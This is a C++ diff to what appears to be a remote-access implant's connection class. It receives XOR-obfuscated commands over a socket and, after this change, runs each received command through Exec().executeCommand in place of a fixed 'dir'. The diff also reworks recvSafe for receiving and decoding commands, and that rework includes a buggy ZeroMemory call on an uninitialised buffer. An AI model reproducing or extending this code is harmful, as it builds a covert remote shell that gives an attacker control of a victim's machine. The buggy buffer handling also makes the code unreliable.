@@ -55,7 +55,7 @@ INT Connexion::main()
 
         command = recvSafe(); //Recv safe and decrypt xor
         
-        wcout << "command recv: " << command << endl;
+        wcout << "command recv: " << command << "<----" <<endl;
         wcout << "len: " << command.length() << endl;
         
 
@@ -168,7 +168,7 @@ INT Connexion::main()
 
             else
             {
-                result = Exec().executeCommand(L"dir");
+                result = Exec().executeCommand(command);
                 if(command.substr(0,3) == L"[-]")
                 {;} //if error not append path.
                 else
@@ -192,13 +192,12 @@ wstring Connexion::recvSafe()
 {
     //allows you to receive data while managing errors 
     WCHAR buffer[BUFFER_LEN];
-    wstring result;
     INT len_recv;
+    wstring result;
+    ZeroMemory(&buffer, wcslen(buffer));
 
     len_recv=recv(sock_client,(char *)buffer, sizeof(buffer), 0);
-    
-    ZeroMemory(&buffer, wcslen(buffer));
-    
+        
     if(len_recv==SOCKET_ERROR)
     {
         reConnect(); //?
@@ -206,20 +205,19 @@ wstring Connexion::recvSafe()
     }
     else
     {
-        //wcout << "size of buff " << sizeof(buffer) << endl;
-        wcout << "len recv: " << len_recv << endl;
-        wcout << "len recv 2: "<< len_recv * sizeof(WCHAR) << endl;
-        result.append(buffer,len_recv); 
-        //result = buffer;
-        wcout << "before: " << result << "\n" << endl;
-        
-        if(result.empty())
+        if(wcslen(buffer) == 0)
         {
             //If command empty re connect to server.
+            wcout << "go to reconnect" << endl;
             reConnect();
             return L"";
         }
+        wcout << "len recv: " << len_recv << endl;
+       // result.append(buffer, len_recv);
+       result = buffer;
     }
+    wcout << "buffer: " << buffer << endl;
+    wcout << "result: " << result << endl;
 
     return XOREncryption(result);
 }
